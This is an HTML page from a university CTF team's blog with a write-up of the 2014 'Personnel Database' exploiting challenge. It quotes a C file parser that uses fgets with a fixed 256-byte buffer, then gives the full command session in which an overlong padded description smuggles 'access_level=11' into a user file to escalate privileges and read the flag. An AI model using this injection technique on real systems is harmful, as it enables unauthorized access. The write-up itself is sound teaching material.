<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Personnel Database</title>
  <meta name="description" content="Category: Exploiting">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="stylesheet" href="/css/bootstrap.css">
  <script src="/js/jquery-1.10.2.min.js"></script>
  <script src="/js/bootstrap.min.js"></script>
  <link rel="canonical" href="http://afnom.net/2014/10/23/23-Personnel_database.html">
  <link rel="alternate" type="application/rss+xml" title="AFiniteNumberOfMonkeys" href="http://afnom.net/feed.xml" />
</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <div class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a href="http://afnom.net/" class="navbar-brand">AFiniteNumberOfMonkeys</a>
          <button class="navbar-toggle" type="button" data-toggle="collapse" data-target="#navbar-main">
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
        </div>
        <div class="navbar-collapse collapse" id="navbar-main">
          <ul class="nav navbar-nav navbar-right">
			<li class="dropdown">
			   <a class="dropdown-toggle" data-toggle="dropdown" href="http://afnom.net" id="home">Home <span class="caret"></span></a>
			   <ul class="dropdown-menu" aria-labelledby="home">
			     <li><a href="http://afnom.net/#who">Who we are</a></li>
			     <li><a href="http://afnom.net/#meetings">Meetings</a></li>
			     <li><a href="http://afnom.net/#tools">Tools</a></li>
			     <li><a href="http://afnom.net/#materials">Learning material</a></li>
			     <li><a href="http://afnom.net/#contact">Contact</a></li>
			   </ul>
			 </li>
            <li><a href="http://afnom.net/writeups.html">Write-ups</a></li>
          </ul>

        </div>
      </div>
    </div>
</div>

        
          
        
          
        
          
        
          
        
          
        


</header>


    <div class="page-content">
      <div class="container">
        <div class="post">

  <header class="post-header">
    <h1 class="post-title">Personnel Database</h1>
    <p class="post-meta">Oct 23, 2014 • Piotr Kordy</p>
  </header>

  <article class="post-content">
    <p><em>Category:</em> Exploiting</p>

<p><em>Points:</em> 150</p>

<p><em>Author:</em> TheJH</p>

<p><em>Description:</em></p>

<p>Lots of criminals in this area work for one big boss, but we have been unable
to determine who he is. We know that their organization has one central
personnel database that might also contain information about their boss,
whose username is simply “boss”. However, when you register in their system,
you only get access level zero, which is not enough for reading data about
the boss - that guy is level 10. Do you think you can get around their
protections?</p>

<p>link: <a href="http://afnom.net/assets/2014/personnel_database_server_67e4ead6aeb111cc19de03d1f3d15fab.c" title="file">personnel_database_server_67e4ead6aeb111cc19de03d1f3d15fab.c</a></p>

<p><code>nc wildwildweb.fluxfingers.net 1410</code></p>

<p>Note: The users dir will be wiped every 5 minutes.</p>

<h2 id="write-up">Write-up</h2>

<p>We are given a source code of the program running on the server. We can run the
following commands:</p>

<ul>
  <li><code>whoami</code> - prints user name</li>
  <li><code>user</code> ‘username’ - set user name for login</li>
  <li><code>pass</code> ‘password’ - provides password and logins us</li>
  <li><code>register</code> ‘username:password’ - registers new user</li>
  <li><code>set_description</code> *description’ - registers new user</li>
  <li><code>logout</code> - logs us out and writes changes to the file</li>
  <li><code>whois</code> ‘username’ - prints info about user - we must have higher acces rights than the user</li>
  <li><code>levelup</code> ‘username’ - increases the access level for the user, but we must have higher access level.</li>
</ul>

<p>Each user have user name, password, access level and descripiton. Usernames are
sanitized to match [a-zA-Z0-9_]{1,20}. The data about each user is stored in
separate file in <code>users</code> directory. The interesting part is how the data about
the user is read from the file:</p>

<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">userdata</span> <span class="o">*</span><span class="nf">read_userfile</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">user</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">struct</span> <span class="n">userdata</span> <span class="o">*</span><span class="n">res</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">res</span><span class="p">));</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open_userfile</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fdopen</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span> <span class="p">}</span>
  <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">f</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">rtrim</span><span class="p">(</span><span class="n">line</span><span class="p">);</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">key</span> <span class="o">=</span> <span class="n">line</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">eqsign</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sc">&#39;=&#39;</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">eqsign</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
    <span class="o">*</span><span class="n">eqsign</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">value</span> <span class="o">=</span> <span class="n">eqsign</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s">&quot;hash&quot;</span><span class="p">))</span> <span class="n">res</span><span class="o">-&gt;</span><span class="n">hash</span> <span class="o">=</span> <span class="n">atoll</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s">&quot;access_level&quot;</span><span class="p">))</span> <span class="n">res</span><span class="o">-&gt;</span><span class="n">access_level</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s">&quot;description&quot;</span><span class="p">))</span> <span class="n">strcpy</span><span class="p">(</span><span class="n">res</span><span class="o">-&gt;</span><span class="n">description</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
    <span class="k">else</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fatal error: bad key </span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s"> in config, aborting</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">key</span><span class="p">),</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span></code></pre></div>

<p>Each line is parsed separatly, but it can be at
most 256 bytes (size of the buffer used). So line longer than 256 bytes will be
read as two separate lines. Here is the example file with user’s data:</p>

<pre><code>hash=770370358
access_level=0
description=some description with = sign
</code></pre>

<p>The idea is to submit line with proper length that will be interpreted as two
lines. In this way we can set our priviliges to high value. </p>

<p>Here is the list of commands that gives us the flag:</p>

<pre><code>nc wildwildweb.fluxfingers.net 1410
&gt; register a:password
user created successfully
&gt; set_description ***************************************************************************************************************************************************************************************************************************************************access_level=11
description set
&gt; logout
Uh, who are you again? I have forgotten.
&gt; user a
username accepted, please provide password
&gt; pass password
login ok
&gt; whois boss
user	boss
level	10
descr	"flag{this_is_why_gets_is_better_than_fgets}"
</code></pre>


  </article>

</div>

      </div>
    </div>

    <hr>
<footer class="site-footer">

  <div class="container">

    <div class="row">
      <div class="col-lg-12">

       
        <p><p>Copyright &copy; University of Birmingham 2014</p></p>

      </div>
    </div>

  </div>

</footer>


  </body>

</html>
